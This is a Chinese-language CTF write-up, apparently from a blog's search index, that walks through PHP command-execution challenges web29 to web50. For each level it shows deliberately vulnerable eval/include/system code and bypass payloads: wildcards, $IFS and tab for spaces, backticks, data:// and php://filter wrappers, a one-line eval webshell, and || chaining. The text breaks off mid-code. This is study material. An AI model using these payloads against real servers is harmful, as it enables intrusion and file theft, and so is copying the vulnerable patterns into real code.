<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/posts/20240316-undefined.html"/>
    <url>/posts/20240316-undefined.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a><a href="">web29</a></h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    }<br>    <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h4><p>此题利用传入的c参数来进行代码执行，不能算是严谨的命令执行。这里注意会对flag字符串进行匹配，只有不匹配上才会进行代码执行，这里需要绕过这个匹配。<br>这里注意一点，因为浏览器默认不显示php的标签所以需要右键查看源代码，或者直接用grep匹配出flag</p><figure class="highlight nsis"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-number">1</span>、用egrep效果一样egrep=grep  -E<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"cat fl*g.php | grep  -E 'fl.g' "</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">2</span>、此种方式需要右键源代码<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"cat fl*g.php"</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">3</span>、<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"tac fl*g.php"</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">4</span>、倒序输出文本<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"tac fl*g.php"</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">5</span>、<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"cp fl*g.php a.txt "</span>)<span class="hljs-comment">;</span><br>访问/a.txt<br><span class="hljs-number">6</span>、直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">'echo -e " &lt;?php \n error_reporting(0); \n  \<span class="hljs-variable">$c</span>= \<span class="hljs-variable">$_GET</span>[\'</span>c\<span class="hljs-string">']; \n eval(\<span class="hljs-variable">$c</span>); " &gt; a.php'</span>)<span class="hljs-comment">;</span><br>/a.php?c=<span class="hljs-params">system</span>(<span class="hljs-string">"tac flag.php"</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">7</span>、<br>c=highlight_file(next(array_reverse(scandir(<span class="hljs-string">"."</span>))))<span class="hljs-comment">;</span><br>将返回最后一个文件或目录的内容进行语法高亮后的字符串。<br></code></pre></td></tr></tbody></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|system|php/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    }<br>    <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h4><p>看过滤，web29的第七个方法可用，另外，还有：</p><p>用反引号代替system函数来起到命令执行的效果</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> fla*`;<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl<span class="hljs-string">''</span>ag.p<span class="hljs-string">''</span>hp`;<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> fl<span class="hljs-string">''</span>ag.p<span class="hljs-string">''</span>hp`;<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> fl*ag.p*hp`;<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cp</span> fl*ag.p*hp 1.txt | <span class="hljs-built_in">cat</span> 1.txt`;<br></code></pre></td></tr></tbody></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    }<br>    <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>过滤了空格，单引号，点等。</p><p>我们可以看到这道题目，过滤了flag|system|php|cat|sort|shell|.| |’<br>我们可以尝试使用passthru来绕过对system的限制；使用%09来绕过对空格的限制；对小数点的限制可以使用通配符*或者占位符？来绕过。</p><p>因为过滤了小数点.，所有无法使用cp命令来进行尝试。过滤了空格，可以使用%09替代；也可以使用{$IFS}<br>还有pos(localeconv)来获取小数点的方法。放在最后的方法4里面写。</p><p>我们先来找一下flag在哪里。 ?c=passthru(‘ls’); 然后尝试拿flag，发现flag被过滤了，php也被过滤了。cat命令也被过滤了。 cat被过滤可以用tac绕过。<br>flag可以用fla*<br>?c=passthru(“tac%09fla*”);<br>注意这里使用双引号。单引号不行，因为它就是字面意思，%09不会被解释为空格。<br>单引号串和双引号串在PHP中的处理是不相同的。双引号串中的内容可以被解释而且替换，而单引号串中的内容总被认为是普通字符。</p><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">方法：<br><span class="hljs-number">01</span> 使用<span class="hljs-keyword">eval</span>嵌套。具体参数：passthru 结合%09<br><br>其中%09绕过空格 ?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=passthru(<span class="hljs-string">"tac%09fla*"</span>); 这里需要注意括号的闭合，&amp;的连接。<br><br><span class="hljs-number">02</span> 使用参数：passthru结合 $IFS$9<br><br>其中$IFS$9绕过空格，注意转义$符号 ?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=passthru(<span class="hljs-string">"tac\$IFS\$9fla*"</span>);<br><br><span class="hljs-number">03</span> 使用未被过滤的命令。passthru直接读取<br><br>?c=passthru(%22tac$IFS$9fla*%22); 也就是passthru(<span class="hljs-string">"tac\$IFS\$9fla*"</span>);<br><br><span class="hljs-number">04</span> 使用<span class="hljs-keyword">pos</span>(localeconv)来获取小数点<br><br>localeconv可以返回包括小数点在内的一个数组；<span class="hljs-keyword">pos</span>去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 ?c=print_r(scandir(<span class="hljs-keyword">pos</span>(localeconv()))); 可以看到当前目录下有flag.php 通过array_reverse把数组逆序，通过<span class="hljs-keyword">next</span>取到第二个数组元素，也即flag.php 然后?c=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(<span class="hljs-keyword">pos</span>(localeconv())))));<br></code></pre></td></tr></tbody></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    }<br>    <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h4><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">过滤空格 和 ;用<span class="hljs-string">?&gt;</span>代替 ;<br><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">0</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?p</span>hp echo(<span class="hljs-string">`cat flag.php`</span>);<span class="hljs-string">?&gt;</span><br><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">0</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></tbody></table></figure><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    }<br>        <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>利用文件包含可以利用伪协议执行命令，data://text/plain,[php代码]</p><figure class="highlight php-template"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">'tac f*'</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></tbody></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|php|file/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;    <br>    }<br></code></pre></td></tr></tbody></table></figure><p>主要是过滤了php标签，绕过：</p><p>在 PHP 中，<code>&lt;?= ?&gt;</code> 是一种简写形式的 PHP 短标签（Short Tags），也称为”echo 标签”。它用于在 HTML 或其他输出上下文中直接输出变量或表达式的值。</p><p><code>&lt;?= ?&gt;</code> 的作用相当于 <code>&lt;?php echo ...; ?&gt;</code>，可以用于输出变量、表达式或函数返回的值。这种短标签的使用使得在模板文件或混合 HTML 和 PHP 代码时，可以更简洁地输出变量值，提高了代码的可读性和简洁性。</p><p>PY:</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">data://<span class="hljs-keyword">text</span>/plain,<span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">"tac f*"</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">".php"</span>);<br>    } <br></code></pre></td></tr></tbody></table></figure><p>拼接的php可以不用管,include只会处理内部的内容，对flag的过滤可以采用拼接的方式</p><figure class="highlight php-template"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">'tac f*'</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></tbody></table></figure><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight swift"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>['c'])){<br>    <span class="hljs-variable">$c</span> <span class="hljs-operator">=</span> <span class="hljs-variable">$_GET</span>['c'];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">!</span>preg_match(<span class="hljs-string">"/[0-9]|\~|\`|\@|\#|<span class="hljs-subst">\\</span>$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|<span class="hljs-subst">\'</span>|<span class="hljs-subst">\"</span>|\,|\&lt;|\.|\&gt;|\/|\?|<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>/i"</span>, <span class="hljs-variable">$c</span>)){<br>        eval(<span class="hljs-variable">$c</span>);<br>    } <br></code></pre></td></tr></tbody></table></figure><p>这里过滤的括号是中文括号，因此可以进行调用各种函数</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?c=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">dir</span>)</span>)));<br></code></pre></td></tr></tbody></table></figure><p>第二个payload:</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?c=eval(<span class="hljs-built_in">array</span><span class="hljs-constructor">_pop(<span class="hljs-params">next</span>(<span class="hljs-params">get_defined_vars</span>()</span>)));<br><span class="hljs-number">1</span><br></code></pre></td></tr></tbody></table></figure><p>通过get_defined_vars()拿到所有元素，再用next找到我们要利用的点，array_pop获取，通过post传参即可</p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">"echo(<span class="hljs-subst">$c</span>);"</span>);<br>    }<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>突破点在异或没有被过滤，可以找到符号条件的字符异或得到</p><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">'c'</span>]))<br>{<br>$c=$_GET[<span class="hljs-string">'c'</span>];<br><span class="hljs-keyword">system</span>($c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>); <br>}<br></code></pre></td></tr></tbody></table></figure><p><code>system($c." &gt;/dev/null 2&gt;&amp;1");</code> 这行代码使用 <code>system()</code> 函数执行外部命令。它将变量 <code>$c</code> 的值与字符串 <code>" &gt;/dev/null 2&gt;&amp;1"</code> 连接，并作为参数传递给 <code>system()</code> 函数。</p><ul><li><code>&gt;/dev/null</code> 是 Linux 中的重定向操作符，将命令的标准输出重定向到 <code>/dev/null</code> 设备文件，这意味着命令的输出将被丢弃。</li><li><code>2&gt;&amp;1</code> 是将命令的标准错误输出重定向到标准输出的操作符。这样，命令的错误输出也将被重定向到 <code>/dev/null</code>，即被丢弃。</li></ul><p>目的是以安静模式运行命令，不显示任何输出，并且将任何错误输出也丢弃</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">;<span class="hljs-regexp">//</span>分号               t<br>|<span class="hljs-regexp">//</span>只执行后面那条命令  f<br>||<span class="hljs-regexp">//</span>只执行前面那条命令  t<br>&amp;<span class="hljs-regexp">//</span>两条命令都会执行    f<br>&amp;&amp;<span class="hljs-regexp">//</span>两条命令都会执行    f<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac flag.php;<br></code></pre></td></tr></tbody></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>添加了过滤</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac flag.php||<br></code></pre></td></tr></tbody></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/;|cat|flag/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>添加了过滤flag</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac f*||<br></code></pre></td></tr></tbody></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| /i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>过滤增加了空格</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac$IFS$9f*||<br>?<span class="hljs-attribute">c</span>=tac%09fla*||<br></code></pre></td></tr></tbody></table></figure><h3 id="web46-49"><a href="#web46-49" class="headerlink" title="web46-49"></a>web46-49</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">46</span>：<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br><span class="hljs-number">47</span>：<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br><span class="hljs-number">48</span>：<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>类上，增加了过滤数字和美元符以及通配符*</p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br></code></pre></td></tr></tbody></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>%09不是数字</p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 